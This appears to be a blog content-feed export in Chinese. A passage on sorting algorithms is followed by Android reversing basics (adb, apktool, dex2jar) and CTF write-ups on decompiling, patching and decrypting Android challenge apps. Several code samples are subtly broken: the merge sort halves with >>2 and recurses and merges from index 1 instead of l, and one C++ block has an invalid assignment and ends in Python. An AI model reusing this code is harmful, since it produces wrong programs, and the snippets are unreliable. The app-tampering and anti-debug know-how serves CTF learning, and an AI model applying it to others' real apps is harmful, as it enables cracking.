class="comment">//第i趟排序后有n-i个未排序的数</span></span><br><span class="line">        <span class="keyword">if</span>(a[j] &gt; a[j+<span class="number">1</span>]) <span class="built_in">swap</span>(a[j], a[j+<span class="number">1</span>]);<span class="comment">//冒泡交换</span></span><br><span class="line">     &#125;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h3><p>这个像所有排序的结合体，虽然说是由冒泡改进而来。同时消除多次逆序</p><ol><li>选择一个枢轴（pivotkey）</li><li>将所有权值小于pivotkey的放在左边，权值大于pivotkey的放在右边</li><li>再将pivotkey归位，放在分界处</li><li>对pivotkey两边的数列重复上述操作，也就是一个递归，直到排序完成</li></ol><h3 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h3><p>拿出第一个乱序数，放到已经排好序的序列的合适位置</p><p>好像挺明了的，可以看成是一个选择排序的进化？</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">insert_sort</span><span class="params">(<span class="type">int</span> a[],<span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j,temp;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">2</span>; i &lt;= n; i++)</span><br><span class="line">&#123;</span><br><span class="line">        temp = a[i];                         <span class="comment">//取出要插入的数</span></span><br><span class="line"><span class="keyword">for</span>(j = i; j &gt; <span class="number">1</span> &amp;&amp; a[j - <span class="number">1</span>] &gt; temp; j--)    <span class="comment">//寻找合适的插入位置</span></span><br><span class="line">            a[j] = a[j - <span class="number">1</span>]; <span class="comment">//没有找到的时候就向后推，把位置空出来</span></span><br><span class="line">a[j] = temp;                                 <span class="comment">//插入数值</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h3><p>这个东西吧，就是分组和插入排序的循环</p><ol><li>在原数组中按照一定间隔从头到尾取出一系列数形成几个新的序列</li><li>对每个新的序列进行插入排序</li><li>按原位置序列合并</li></ol><p>至于这个间隔，就涉及到希尔增量，举个例子就明白了，分组不断降低。</p><p>比如对半式增量：</p><ul><li>一个长度为8的数组，8&#x2F;2 &#x3D; 4，所以第一次就按间隔为4取数，那么形成的新序列的下标就是：&lt;1 5&gt;,&lt;2 6&gt;,&lt;3 7&gt;,&lt;4 8&gt;</li><li>第二次间隔为4&#x2F;2 &#x3D; 2，则新取出的序列为&lt;1 3 5 7&gt;,&lt;2 4 6 8&gt;</li><li>然后下一次就是2&#x2F;2 &#x3D; 1，没得分了，排序也就结束了</li></ul><h3 id="基数排序"><a href="#基数排序" class="headerlink" title="基数排序"></a>基数排序</h3><p>这个不好描述，不写了~</p><ol><li>选取有效位(个十百千万)</li><li>将元素按顺序放进对应数字（0-9）的队列</li><li>再按0-9的顺序将每个队列的元素拿出来</li><li>重复上述过程，直到排序完成（有效位的选取是从低到高的）</li></ol><h3 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h3><p>整体就是无限二分和选数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里a和b数组没有声明，应该写到外面，a数组是录入数据的数组</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Merge_sort</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//递归到了只有一个元素，直接返回</span></span><br><span class="line">    <span class="keyword">if</span>(l == r) <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">//找到中点，然后两边分别再归并（二分）</span></span><br><span class="line">    <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">Merge_sort</span>(<span class="number">1</span>, mid);</span><br><span class="line">    <span class="built_in">Merge_sort</span>(mid + <span class="number">1</span>, r);</span><br><span class="line">    <span class="comment">//合并序列（选数）</span></span><br><span class="line">    <span class="type">int</span> p = <span class="number">1</span>, q = mid + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= r; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(q &gt; r || (p &lt;= mid &amp;&amp; a[p] &lt;= a[q])) b[i] = a[p++];</span><br><span class="line">        <span class="keyword">else</span> b[i] = a[q++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//还原到a数组里</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= r; i++) a[i] = b[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="桶（计数）排序"><a href="#桶（计数）排序" class="headerlink" title="桶（计数）排序"></a>桶（计数）排序</h3><ul><li>适用于数据集中，数据范围较小且比较明确的情况</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXN 10000</span></span><br><span class="line"><span class="type">int</span> cnt[MAXN+<span class="number">1</span>],n,temp;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//输入</span></span><br><span class="line">    <span class="built_in">memset</span>(cnt,<span class="number">0</span>,<span class="built_in">sizeof</span>(cnt));</span><br><span class="line">    cin &gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">        cin &gt;&gt;temp;</span><br><span class="line">        cnt[temp]++; <span class="comment">//计数</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//输出</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= MAXN; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(cnt[i])&#123; <span class="comment">//检测数字i有没有出现过</span></span><br><span class="line">            <span class="comment">//出现几次输出几个i</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt;= cnt[i]; j++) cout &lt;&lt;i &lt;&lt;<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Computer </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Computer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android-base</title>
      <link href="/2023/03/31/Android/"/>
      <url>/2023/03/31/Android/</url>
      
        <content type="html"><![CDATA[<ul><li>Android system architecture</li><li>Apk directory structure</li><li>Four components of Android</li><li>Arm pipeline</li><li>ADB</li><li>termux<span id="more"></span></li></ul><HR color="red"></HR><h2 id="安卓系统架构"><a href="#安卓系统架构" class="headerlink" title="安卓系统架构"></a>安卓系统架构</h2><ul><li>应用层</li><li>应用框架<ul><li>应用开发组件、开发包</li></ul></li><li>dalvik虚拟机<ul><li>Google自己设计用于Android平台的虚拟机，可支持.dex格式的java应用程序运行</li></ul></li><li>linux内核<ul><li>包括一些系统驱动等</li></ul></li></ul><h2 id="apk目录结构"><a href="#apk目录结构" class="headerlink" title="apk目录结构"></a>apk目录结构</h2><ol><li>assets<ul><li>静态文件，apk所使用的各种资源，比如图片、视频等等，通过API获取</li></ul></li><li>res<ul><li>编译后的资源文件</li></ul></li><li>lib<ul><li>so动态链接库，用于底层的一些调用</li></ul></li><li>dex<ul><li>虚拟机可执行文件，主要逆向目标</li></ul></li><li>META-INF<ul><li>数字签名，用于校验apk是否被篡改</li></ul></li><li>AndroidManifest.xml<ul><li>一个应用程序的配置清单，声明权限、组件等的基本信息</li></ul></li><li>resources.arsc<ul><li>编译后资源的位置与id之间的映射关系</li></ul></li></ol><h2 id="Android四大组件"><a href="#Android四大组件" class="headerlink" title="Android四大组件"></a>Android四大组件</h2><ol><li>activity<ul><li>用户可视化界面</li><li>safe：1.点击劫持 2.拒绝服务 3.组件导出</li></ul></li><li>service<ul><li>用于后台实现操作，如后台接受微信消息</li><li>safe：1.串谋攻击 2.拒绝服务</li></ul></li><li>content provider<ul><li>为应用提供数据，统一接口</li><li>safe：1.数据库注入</li></ul></li><li>broadcast receiver<ul><li>信息传输机制</li><li>safe：恶意广播</li></ul></li></ol><p>注：所有组件均需在AndroidManifest中注册声明</p><p>参考文章：<a href="https://blog.csdn.net/ican87/article/details/21874321">(1条消息) android四大组件(详细总结)_87now的博客-CSDN博客_android的四大组件</a></p><h2 id="Android打包流程"><a href="#Android打包流程" class="headerlink" title="Android打包流程"></a>Android打包流程</h2><h2 id="Android安装流程"><a href="#Android安装流程" class="headerlink" title="Android安装流程"></a>Android安装流程</h2><ul><li>复制APk安装包到data&#x2F;app目录下，解压扫描安装包，把dex文件保存到dalvik-cache目录，并在data&#x2F;data目录创建对应的应用数据。（AndroidManifest.xml）</li></ul><h2 id="arm流水线"><a href="#arm流水线" class="headerlink" title="arm流水线"></a>arm流水线</h2><ul><li>PC：程序计数器。永远指向取指地址</li><li>IF：取指。同时确定下一条指令地址（指针指向下一条指令）</li><li>ID：译码。同时给出即将使用的寄存器，或者让立即数进行拓展，亦或者是给出转移目的寄存器与转移条件（转移指令）</li><li>EX：执行。</li><li>MEM：访存。若为load&#x2F;store指令，这个阶段就要访问存储器。另外，在这个阶段还要判定是否有异常要处理，如果有，那么就清除流水线，然后转移到异常处理例程入口地址处继续执行</li><li>WB：回写。将运算结果保存到目标寄存器</li></ul><h4 id="三级流水线"><a href="#三级流水线" class="headerlink" title="三级流水线"></a>三级流水线</h4><ul><li>取指–&gt;译码–&gt;执行</li><li>pc–&gt;pc-4–&gt;pc-8 (arm7)</li></ul><h4 id="五级流水线"><a href="#五级流水线" class="headerlink" title="五级流水线"></a>五级流水线</h4><ul><li>取指–&gt;译码–&gt;执行–&gt;访存–&gt;回写 (arm9)</li></ul><h4 id="Notice"><a href="#Notice" class="headerlink" title="Notice"></a>Notice</h4><ul><li>我觉得需要强调的一个点是理论和实践是不一样的。不一定所有指令都要经历流水线的每个过程</li><li>具体参考文章：<a href="https://zhuanlan.zhihu.com/p/438259856">CPU设计—五级流水线 - 知乎 (zhihu.com)</a></li></ul><h2 id="ADB"><a href="#ADB" class="headerlink" title="ADB"></a>ADB</h2><ul><li>adb devices 列出当前安卓设备</li><li>adb shell 进入安卓linux命令行</li><li>adb push 上传</li><li>adb pull 下载</li><li>adb connect ip连接设备</li><li>adb kill-server 断开连接</li><li>adb forward tcp:23946 tcp:23946 端口转移到本地</li><li>adb shell dumpsys activity top 查看顶层页面信息</li><li>adb shell dbinfo 查看app使用的数据库信息</li><li>adb shell screencap -p [path] 截屏</li><li>adb shell input text [text] 文本框输入</li><li>adb shell pm install &#x2F; pm uninstall &#x2F; pm list packages</li><li>adb shell am start-activity -D -N [包名] debug</li></ul><h2 id="termux使用"><a href="#termux使用" class="headerlink" title="termux使用"></a>termux使用</h2><ul><li>下载地址：<a href="https://f-droid.org/packages/com.termux/">Termux | F-Droid - Free and Open Source Android App Repository</a></li></ul><h4 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h4><ul><li><p>termux-setup-storage 获取存储权限</p></li><li><p>pkg install &lt;软件名&gt; 安装软件</p></li><li><p>pkg upgrade 更新软件</p><p>termux-change-repo 切换源</p></li></ul><h2 id="静态插桩"><a href="#静态插桩" class="headerlink" title="静态插桩"></a>静态插桩</h2><ul><li>找到函数入口点</li></ul><h2 id="敏感信息"><a href="#敏感信息" class="headerlink" title="敏感信息"></a>敏感信息</h2><h4 id="动态注册"><a href="#动态注册" class="headerlink" title="动态注册"></a>动态注册</h4><ul><li>Jni_OnLoad</li></ul><h4 id="签名"><a href="#签名" class="headerlink" title="签名"></a>签名</h4><ul><li>getPackageManager</li><li>getPackageInfo</li><li>signatures</li></ul><h4 id="模拟器检测"><a href="#模拟器检测" class="headerlink" title="模拟器检测"></a>模拟器检测</h4><ul><li>checkcpuinfo</li></ul><h4 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h4><ul><li>android-server</li></ul><h2 id="apktool反编译命令"><a href="#apktool反编译命令" class="headerlink" title="apktool反编译命令"></a>apktool反编译命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apktool目录进入命令行</span><br><span class="line">apktool.bat d 反编译文件</span><br></pre></td></tr></table></figure><h2 id="dex2-jdgui反编译"><a href="#dex2-jdgui反编译" class="headerlink" title="dex2+jdgui反编译"></a>dex2+jdgui反编译</h2><ol><li>修改apk文件后缀为zip，解压</li><li>将反编的dex文件复制到dex2jar工具目录下</li><li>使用命令生成jar文件</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d2j-dex2jar.bat document_name.dex</span><br></pre></td></tr></table></figure><p>如果出现下列报错(版本号不匹配):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">com.googlecode.d2j.DexException: not support version.</span><br><span class="line">     at com.googlecode.d2j.reader.DexFileReader.&lt;init&gt;(DexFileReader.java:151)</span><br><span class="line">     at com.googlecode.d2j.reader.DexFileReader.&lt;init&gt;(DexFileReader.java:211)</span><br><span class="line">     at com.googlecode.dex2jar.tools.Dex2jarCmd.doCommandLine(Dex2jarCmd.java:104)</span><br><span class="line">     at com.googlecode.dex2jar.tools.BaseCmd.doMain(BaseCmd.java:288)</span><br><span class="line">     at com.googlecode.dex2jar.tools.Dex2jarCmd.main(Dex2jarCmd.java:32)</span><br></pre></td></tr></table></figure><p>用文本编辑软件打开dex文件，将文件头改为035或者036</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dex</span><br><span class="line">037 9!Q&lt;€颧€?滣^氶wl?  p   x</span><br></pre></td></tr></table></figure><p>正常情况应该是这样的(没有任何多余)：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">E:\SoftWarePackage\Jd-GUI+dex2\dex2jar-2.0&gt;d2j-dex2jar.bat classes3.dex</span><br><span class="line">    dex2jar classes3.dex -&gt; .\classes3-dex2jar.jar</span><br></pre></td></tr></table></figure><ol><li><p>用jd-guijar反编译jar文件，命令是这个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jd-gui-1.5.0.jar</span><br></pre></td></tr></table></figure><ul><li>其实就是执行jar文件而已，可以直接写bat桌面一键打开</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GFSJ-Android</title>
      <link href="/2023/03/31/GFSJ-Android/"/>
      <url>/2023/03/31/GFSJ-Android/</url>
      
        <content type="html"><![CDATA[<ul><li>GFSJ-Android<span id="more"></span></li></ul><HR color="red"></HR><h3 id="app1"><a href="#app1" class="headerlink" title="app1"></a>app1</h3><ul><li>jad直接反编译，MainActivity发现版本号与版本名的异或</li><li><code>水题</code>，<code>简单使用工具</code></li></ul><h3 id="easy-apk"><a href="#easy-apk" class="headerlink" title="easy-apk"></a>easy-apk</h3><ul><li>变表base64</li><li><code>水题</code></li></ul><h3 id="app2"><a href="#app2" class="headerlink" title="app2"></a>app2</h3><ul><li>逻辑分析SecondActivity，从而找到加密so文件，确定AES加密，解密</li><li><code>so分析</code>，<code>AES</code></li></ul><h3 id="easy-so"><a href="#easy-so" class="headerlink" title="easy-so"></a>easy-so</h3><ul><li>同样从java代码找到so文件关键代码分析，两个简单换位加密</li><li><code>so分析</code>，<code>简单加密</code></li></ul><h3 id="easy-jni"><a href="#easy-jni" class="headerlink" title="easy-jni"></a>easy-jni</h3><ul><li>毫无新意，同样so分析，变表base64加换位</li></ul><h3 id="RememberOther"><a href="#RememberOther" class="headerlink" title="RememberOther"></a>RememberOther</h3><ul><li>评价就是有病</li><li>直接jadx查看逻辑发现啥都不填return true，MD5解密+安卓就是flag</li></ul><h3 id="基础android"><a href="#基础android" class="headerlink" title="基础android"></a>基础android</h3><ul><li>好题，java层简单加密，以及对广播的一个考察</li><li><code>简单逆向</code>，<code>Broadcast</code>，<code>页面跳转</code>，<code>文件流</code></li></ul><h3 id="app3"><a href="#app3" class="headerlink" title="app3"></a>app3</h3><ul><li>ab文件–&gt;安卓备份文件</li><li>先用<a href="https://github.com/nelenkov/android-backup-extractor">abe</a>提取一下apk</li><li>java -jar abe.jar unpack app3.ab app3.tar</li><li>破解数据库密码</li><li><a href="https://github.com/sqlitebrowser/sqlitebrowser">sqlitebrowser</a> 打开携带的数据库找到flag</li><li><code>sqlite</code>、<code>安卓备份</code></li></ul><h3 id="Ph0en1x-100"><a href="#Ph0en1x-100" class="headerlink" title="Ph0en1x-100"></a>Ph0en1x-100</h3><ul><li>同样是native层对flag的一个加密，解法很多</li><li>本质就是一个getflag函数外套了一个getSecret函数，IDA分析getSecret发现就是一个rot1</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(this.getSecret(this.getFlag()).equals(this.getSecret(this.encrypt(sInput)))) &#123;</span><br><span class="line">          Toast.makeText(this, <span class="string">&quot;Success&quot;</span>, <span class="number">1</span>).show();</span><br></pre></td></tr></table></figure><ul><li>1：直接androidkiller篡改代码，打印出执行完getSecret(getflag())函数的返回值，然后进行回转得到flag</li><li>2：jeb下断点，动调获得返回值</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;ek`fz@q2^x/t^fn0mF^6/^rb`qanqntfg^E`hq|&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)+<span class="number">1</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li><code>native</code>,<code>hook</code></li></ul><h3 id="APK逆向"><a href="#APK逆向" class="headerlink" title="APK逆向"></a>APK逆向</h3><ul><li>java层仿写加密即可，但是md5加密时候给我报错了：<ul><li>Unhandled exception: java.security.NoSuchAlgorithmException</li></ul></li><li>所以我直接jeb动调把加密后的串提取出来了</li><li>逻辑分析也可以，不难</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        checkSN(<span class="string">&quot;Tenshine&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">toHexString</span><span class="params">(<span class="type">byte</span>[] bytes, String separator)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">hexString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">byte</span> b : bytes) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">hex</span> <span class="operator">=</span> Integer.toHexString(b &amp; <span class="number">255</span>);</span><br><span class="line">            <span class="keyword">if</span> (hex.length() == <span class="number">1</span>) &#123;</span><br><span class="line">                hexString.append(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            hexString.append(hex).append(separator);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> hexString.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">checkSN</span><span class="params">(String userName)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">hexstr</span> <span class="operator">=</span> <span class="string">&quot;b9c77224ff234f27ac6badf83b855c76&quot;</span>;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; hexstr.length(); i += <span class="number">2</span>) &#123;</span><br><span class="line">            sb.append(hexstr.charAt(i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">userSN</span> <span class="operator">=</span> sb.toString();</span><br><span class="line">        System.out.println(userSN);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>难度一般</li></ul><h3 id="人民的名义-抓捕赵德汉1-200"><a href="#人民的名义-抓捕赵德汉1-200" class="headerlink" title="人民的名义-抓捕赵德汉1-200"></a>人民的名义-抓捕赵德汉1-200</h3><ul><li>🤡题，生成flag的md5结果裸奔，直接拿去解密即可</li><li>原意应该是利用hexkey对&#x2F;ClassEnc文件进行aes解密，得到已经存在的CheckPass代码，然后生成passCheckObject对象</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">filename=<span class="string">&quot;ClassEnc&quot;</span></span><br><span class="line">key = <span class="string">&quot;bb27630cf264f8567d185008c10c3f96&quot;</span></span><br><span class="line">key_bytes = <span class="built_in">bytes</span>.fromhex(key)</span><br><span class="line">aes = AES.new((key_bytes), AES.MODE_ECB)</span><br><span class="line">data = <span class="built_in">bytearray</span>(os.path.getsize(filename))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.readinto(data)</span><br><span class="line">f.close()</span><br><span class="line">decryption_data = aes.decrypt(data)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename+<span class="string">&quot;_decryption.classs&quot;</span>, <span class="string">&#x27;ba&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(decryption_data)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><h3 id="Android2-0"><a href="#Android2-0" class="headerlink" title="Android2.0"></a>Android2.0</h3><ul><li>native层的一个题，加密类似于栅栏密码之后三组异或，分别解开就行</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//分组init</span></span><br><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">Init</span><span class="params">(<span class="type">char</span> *a2, <span class="type">char</span> *a3, <span class="type">const</span> <span class="type">char</span> *a4, <span class="type">int</span> a5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r10</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// r6</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v7 = v5 % <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> (v7== <span class="number">2</span>)&#123;</span><br><span class="line">      a3[v5/<span class="number">3</span>] = a4[v5];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (v7 == <span class="number">1</span>)&#123;</span><br><span class="line">      a2[v5/<span class="number">3</span>] = a4[v5];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (v7 == <span class="number">0</span>)&#123;</span><br><span class="line">      *(v5/<span class="number">3</span>) = a4[v5];</span><br><span class="line">    &#125;</span><br><span class="line">    ++v5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span>(a5 != v5);</span><br><span class="line">&#125;</span><br><span class="line">s1 = <span class="string">&quot;fgorl&quot;</span></span><br><span class="line">s2 = <span class="string">&quot;l&#123;sra&quot;</span></span><br><span class="line">s3 = <span class="string">&quot;asoy&#125;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line"><span class="built_in">print</span>(s1[i]+s2[i]+s3[i],end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="easy-dex"><a href="#easy-dex" class="headerlink" title="easy-dex"></a>easy-dex</h3><h4 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h4><ul><li>这个题蛮有意思，把dex文件放进了native层</li><li>so文件拖进IDA找到android-main函数定位关键代码</li><li>之后分析解密dump出dex文件，放进原apk中重新识别</li><li>jadx分析发现twofish加密，在线网站解密</li></ul><h4 id="一些细节"><a href="#一些细节" class="headerlink" title="一些细节"></a>一些细节</h4><ul><li>dex段的数据，可以看到从0x7004开始，长度为0x34c10。</li><li>至于dex的加密，他是设定了10秒摇手机90次，然后用dex文件段的数据分10组去和摇晃次数做一个异或，最后释放解密的dex文件，进行正常的程序运行，这里放一个网上的代码</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 